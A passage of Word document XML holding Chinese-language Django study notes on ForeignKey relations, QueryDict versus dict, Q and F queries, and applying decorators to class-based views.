          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>）和一对多字段的查询。（或许你会有疑问，没有一个叫</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>OneToManyField</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的东西啊。实际上</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ForeignKey</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>就是一个多对一的字段，而被</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ForeignKey</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>关联的字段就是一对多字段了）</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="5403A6C7" w14:textId="038A07AB" w:rsidR="00024E97" w:rsidRDefault="00B73D4C"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020</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>QueryDict</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B22160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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>属性是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django.http.QueryDict</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>类的实例。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>QueryDict</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>类似字典的自定义类，用来处理单键对应多值的情况。在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequest </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>属性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> GET </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> POST </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>得到的都是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.http.QueryDict </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>所创建的实例。这是一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">django </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>自定义的类似字典的类，用来处理同一个键带多个值的情况。在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> python </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>原始的字典中，当一个键出现多个值的时候会发生冲突，只保留最后一个值。而在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTML </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>表单中，通常会发生一个键有多个值的情况，例如，多选框就是一个很常见情况。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">request.POST </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">request.GET </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">QueryDict </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>在一个正常的请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>响应循环中是不可变的。若要获得可变的版本，需要使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.copy()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B30BEA" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>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python dict</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>当一个键出现多个值的时候会发生冲突，只保留最后一个值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DCEAE5" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>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QueryDict</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是类似字典的自定义类，用来处理单键对应多值的情况。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="462C39B1" w14:textId="1F920DED" w:rsidR="00024E97" w:rsidRDefault="00B73D4C"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021</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中查询</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AE27B9" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>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Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>查询：对数据的多个字段联合查询（常和且或非</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"&amp;|~"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>进行联合使用）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1936B7AE" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>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F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>查询：对数据的不同字段进行比较（常用于比较和更新，对数据进行加减操作）</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="63314F06" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00024E97">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="4" w:color="EEEEEE"/>
        </w:pBdr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>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视图层</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7094C834"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02.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的程序添加装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D15EF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from django.utils.decorators import method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7933F45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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59311DD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def post(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C53C87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 xml:space="preserve">    '''</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>给方法加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453DFF2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767356E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41DA024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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6395811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def dispatch(self, request, *args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7986CE8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给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AF376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33EDB3E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411B68F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 name="get")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53962FC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 name="post")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B3EF0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HomeView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E51A6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给类加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383208B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7284B8D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导入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> method_decorator </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B39C3E" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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给方法加</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7DE0D9" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
